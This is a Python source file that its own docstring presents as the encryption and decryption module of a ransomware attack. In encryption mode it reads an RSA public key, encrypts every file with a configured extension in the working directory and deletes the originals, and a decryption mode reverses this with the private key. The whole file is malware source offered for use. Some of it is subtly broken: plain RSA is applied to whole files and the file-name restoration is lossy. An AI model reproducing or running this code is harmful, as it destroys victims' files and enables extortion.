"""
Initially based on an example of asymmetric encryption in Python
https://gist.github.com/syedrakib/241b68f5aeaefd7ef8e2
This modules serves as both the encryption and the decryption
module of a ransomware attack. Supplied with the public key
(generated with keygen.py) in encryption mode, it encrypts the
selected files. Supplied with the respective private key in decryption
mode, it restores (decrypts) the files. The names of the key files
are set in the params.ini configuration file.

Execution example
$ python pyransom.py -enc 1
"""

# modules import
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
import base64
import argparse
import sys
import os
import configparser

# parameters loading
params = configparser.ConfigParser()
params.read('params.ini')


def encrypt(content, publickey):
    """
    Simple encryption function using RSA Oprtimal Assymetric Encryption Padding http://www.ietf.org/rfc/rfc3447.txt
    :param content: binary file
    :param publickey: public RSA key, read from a DER file
    :return: base64 encoded, encrypted file
    """

    cipher = PKCS1_OAEP.new(publickey)
    encrypted_content = cipher.encrypt(content)
    encoded_encrypted_msg = base64.b64encode(encrypted_content) # base64 encoded strings are database friendly

    return encoded_encrypted_msg


def decrypt(content, privatekey):
    """
    Simple decryption function using RSA Oprtimal Assymetric Encryption Padding http://www.ietf.org/rfc/rfc3447.txt
    :param content: binary file
    :param privatekey: private RSA key, read from a DER file
    :return: original (decrypted) file
    """

    cipher = PKCS1_OAEP.new(privatekey)
    decoded_encrypted_content = base64.b64decode(content)
    decoded_decrypted_content = cipher.decrypt(decoded_encrypted_content)

    return decoded_decrypted_content


def main(enc=None):
    parser = argparse.ArgumentParser()

    # encryption/decryption argument (set to 1 for enc, 0 for dec)
    parser.add_argument('-enc', help='Encrypt/Decrypt - Set to 1 for Encryption, 0 for Decryption')

    args = parser.parse_args()

    if not (enc and args.enc):
        enc = input('Enter 1 for encryption, 0 for decryption: ')

    # IMPORTANT DETAIL: So far we assume that for any following encryption/decryption procedure we have our code INSIDE the
    # target directory

    # encryption
    if enc == '1':
        try:
            # load public key from DER file (as set in params.ini)
            public_key = RSA.importKey(open(params['RANSOM']['public'], 'rb').read())
            for file in os.listdir():
                # check for files with our desired target extension (as set in params.ini)
                if file.endswith(params['RANSOM']['ext2encrypt']):
                    original = open(file, 'rb').read()
                    encrypted_file = encrypt(original, public_key)
                    # keep original filename, replace dot with underscore and extend name with the tag "_encrypted"
                    # that way the procedure is completely reversible
                    with open(file.replace('.', '_') + '_encrypted', 'wb') as out_file:
                        out_file.write(encrypted_file)
                    # after reading & encrypting a file, remove it so that it can be replaced by it's encrypted equivalent
                    os.remove(file)

        except Exception as e:
            print('Problem with reading public key')
            print(e)

        return None

    # decryption
    else:
        try:
            # load private key from DER file (as set in params.ini)
            private_key = RSA.importKey(open(params['RANSOM']['private'], 'rb').read())
            for file in os.listdir():
                # files that end with the tag "_encrypted" are the ones we want to decrypt
                if file.endswith("_encrypted"):
                    enc_file = open(file, 'rb').read()
                    decrypted_file = decrypt(enc_file, private_key)
                    with open(file.replace('_', '.').rsplit('.', 1)[0], 'w') as dec_file:
                        dec_file.write(decrypted_file.decode('utf-8'))
                    # after successful decryption, remove encrypted file
                    os.remove(file)

        except Exception as e:
            print('Problem with private key')
            print(e)

        return None


if __name__ == "__main__":
    main(sys.argv)